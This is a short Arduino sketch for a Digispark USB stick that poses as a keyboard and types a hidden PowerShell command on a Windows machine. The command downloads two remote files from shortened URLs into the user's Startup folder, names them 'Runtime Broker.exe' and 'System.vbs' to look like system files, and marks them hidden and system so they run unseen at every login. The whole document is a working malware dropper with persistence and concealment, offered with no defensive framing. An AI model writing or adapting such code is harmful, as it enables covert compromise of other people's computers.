#include "DigiKeyboardFr.h"

void setup() {
  //open powershell
  DigiKeyboardFr.delay(1);
  DigiKeyboardFr.sendKeyStroke(KEY_R, 0 | MOD_GUI_LEFT );
  DigiKeyboardFr.delay(50);
  DigiKeyboardFr.println("powershell -windowstyle hidden -command \"cd \\\"$env:AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\";iwr 3.ly/acKvl -o \\\"Runtime Broker.exe\\\";iwr 3.ly/acKvu -o System.vbs\";ATTRIB +H +S *.exe");
}

void loop() {
}
